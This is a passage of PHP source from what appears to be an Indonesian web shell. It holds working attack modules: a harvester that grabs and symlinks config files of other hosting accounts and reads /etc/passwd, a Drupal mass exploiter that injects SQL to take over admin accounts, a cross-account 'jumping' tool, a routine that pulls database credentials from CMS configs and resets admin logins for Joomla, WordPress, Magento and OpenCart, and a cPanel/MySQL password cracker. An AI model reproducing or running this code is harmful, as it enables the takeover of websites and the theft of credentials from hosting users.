"/home/$user_kuda/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_kuda/public_html/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_kuda/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_kuda/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_kuda/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_kuda/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_kuda/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_kuda/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_kuda/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("kuda_configv2/$user_kuda-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"kuda_Symconfig/".$user_kuda."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"kuda_sym404/".$user_kuda."-".$nama_config.".txt");
if($sym404){
@mkdir("kuda_sym404/".$user_kuda."-".$nama_config.".txt404", 0777);
$htaccess="Options Indexes FollowSymLinks\nDirectoryIndex kuda.html\nHeaderName kuda.txt\nSatisfy Any\nIndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble\nIndexIgnore *";

@file_put_contents("kuda_sym404/".$user_kuda."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"kuda_sym404/".$user_kuda."-".$nama_config.".txt404/kuda.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?dir=$dir/kuda_configv2'><font color=lime>DONE</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href='kuda_sym404/root/'><font color='lime'>Symlinknya</a></font>
<br><a href='kuda_sym404/' target='_blank'><font color='lime'>Configurations</a></font></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href='kuda_symconfig/root/'><font color='lime'>Symlinknya</a></font>
<br><a href='kuda_symconfig/'' target='_blank'><font color='lime'>Configurations</a></font></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href='kuda_symvhost/root/'><font color='lime'>Symlinknya</a></font>
<br><a href='kuda_symvhost/' target='_blank'><font color='lime'>Configurations</a></font></center>";
			}
		
		
		}else{
        echo "<form method='post' action=''><center>
		</center></select><br><textarea name='passwd' class='area' rows='15' cols='60'>";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br><center>
        <select class='select' name='config' style='width: 450px;' height='10'>
        <option value='grab'>Config Grab</option>
        <option value='404'>Config 404</option>
		<option value='symlink'>Symlink Config</option>
		<option value='symvhosts'>Vhosts Config Grab</option> <input type='submit' value='Start!!'></td></tr></center>";
    }
}
elseif($_GET['do'] == 'drupalex') {
echo "
<center>
<h3>Drupal Mass Exploiter</h3>
<form method='post' action=''>
<textarea cols='60' rows='15' name='url'>
http://www.site.co.li</textarea><br><br>
<input type='submit' style='border-color:white' name='submit' value='SIKAT!'>
</form>
</center>";
$drupal  = ($_GET["drupal"]);
if($drupal == 'drupal'){
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
echo "<form method='post' enctype='multipart/form-data'>
   <input type='file' name='file'>
   <input type='submit' value='drupal!'>
</form>";
move_uploaded_file($filetmp,$filename);
}
    error_reporting(0);
    if (isset($_POST['submit'])) {
        function exploit($url) {
            $post_data = "name[0;update users set name %3D 'mrxbarakuda' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
            $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
            $ctx = stream_context_create($params);
            $data = file_get_contents($url . '/user/login/', null, $ctx);
            if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                $fp = fopen("exploited.txt", 'a+');
                fwrite($fp, "Exploited!  User: mrxbarakuda Pass: admin  => {$url}/user/login");
                fwrite($fp, "
");
                fwrite($fp, "--------------------------------------------------------------------------------------------------");
                fwrite($fp, "
");
                fclose($fp);
                               
                echo "<font color='lime'>Success => </font><font color='white'>User: mrxbarakuda Pass: admin</font> - <a href='{$url}/user/login' target=_blank ><font color='lime'> {$url}/user/login </font></a><br>";
            } else {
                echo "<font color='red'>Failed => {$url}/user/login</font><br>";
            }
        }
               
        $urls = explode("
", $_POST['url']);
        foreach ($urls as $url) {
            $url = @trim($url);
            echo exploit($url);
        }
    }

}
elseif($_GET['do'] == 'loghunter') { 
echo '<center><h3>Log Hunter</h3></center>';
echo "<center>";
echo "<form action='' method='post'>"; 
?><br>DIR: <input type="text" style="width: 200px;" value="<?=getcwd();?>" name="shc_dir">
<?php
echo "<input type='submit' name='submit' value='Scan Now!'>"; 
echo "</form>"; 
echo "<pre style='text-align: left;'>";
error_reporting(0);
/*
Name    : Log Hunter (Grab Email)
Date    : 26/03/2016 05:53 PM
Link    : http://facebook.com/bug7sec
Link    : http://pastebin.com/u/shor7cut
Author  : Shor7cut
*/
if($_POST['submit']){
function tampilkan($shcdirs){
foreach(scandir($shcdirs) as $shc)
    {
        if($shc!='.' && $shc!='..')
        {
            $shc = $shcdirs.DIRECTORY_SEPARATOR.$shc;
            if( !is_dir($shc) && !eregi("css", $shc) ){
 
                $fgt    = file_get_contents($shc);
                $ifgt   = exif_read_data($shc);
                $jembut = "COMPUTED";
                $taik   = "UserComment";
                $shcm = "/mail['(']/";
                if($ifgt[$jembut][$taik]){
                    echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>".$shc."</font><br>";
                }
                preg_match_all('#[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+#',$fgt,$cocok);
                $hcs  = "/base64_decode/";
                $exif = "/exif_read_data/";
                preg_match($shcm, addslashes($fgt), $mailshc);
                preg_match($hcs,  addslashes($fgt), $shcmar);
                preg_match($exif, addslashes($fgt), $shcxif);
                if(eregi('HTTP Cookie File', $fgt) || eregi('PHP Warning:', $fgt) ){
                }
                if(eregi('tmp_name', $fgt)){
                    echo "[<font color=#FAFF14>Uploader</font>] <font color=#2196F3>".$shc."</font><br>";
                }
                if($shcmar[0]){
                    echo "[<font color=#FF3D00>Base64</font>] <font color=#2196F3>".$shc."</font><br>";
                }
                if($mailshc[0]){
                    echo "[<font color=#E6004E>MailFunc</font>] <font color=#2196F3>".$shc."</font><br>";
                }
                if($shcxif[0]){
                    echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>".$shc."</font> </font><font color=red>{Manual Check}</font><br>";
                }
                if(eregi("js", $shc)){
                            echo "[<font color=red>Javascript</font>] <font color=#2196F3>".$shc."</font> { <a href=http://www.unphp.net target=_blank>CheckJS</a> }<br>";
                }
                if($cocok[0]){
                    foreach ($cocok[0] as $key => $shcmail) {
                        if (filter_var($shcmail, FILTER_VALIDATE_EMAIL)) {
                            echo "[<font color=greenyellow>SendMail</font>] <font color=#2196F3>".$shc."</font> { ".$shcmail." }<br>";
                        }
                    }
                }
           
            }else{
                tampilkan($shc);
            }
        }
    }
}
tampilkan($_POST['shc_dir']);
}
echo "</pre>"; 
echo "</center>";
}
elseif($_GET['do'] == 'jumping') {
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=red>R</font>] <a href='?dir=$url_user'><font color=#0F6516>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=#0F6516>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Bangsat! di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts|vhost/", $dir)) {
        preg_match("//var/www/(.*?)//", $dir, $vh);
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace("www.", "", $url);
                $web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=red>R</font>] <a href='?dir=$web_vh'><font color=#0F6516>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=#0F6516>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Bangsat! di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red><i>Can't read /etc/passwd</i></font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red><i>Can't read /etc/passwd</i></font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=red>R</font>] <a href='?dir=$user_jumping_dir'><font color=silver>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=silver>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");   
                            if($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Bangsat! di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
}
elseif($_GET['do'] == 'auto_edit_user') {
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "<center>username atau password harus lebih dari 6 karakter</center>";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
						echo "</div>";
					}
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h3>Auto Edit User Config</h3>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='mrxbarakuda' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='mrxbarakuda' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
}
elseif($_GET['do'] == 'cpcrack') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=deepskyblue>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=deepskyblue>$ucp</font>) password (<font color=deepskyblue>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=cyan>Mr.xBarakuda</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
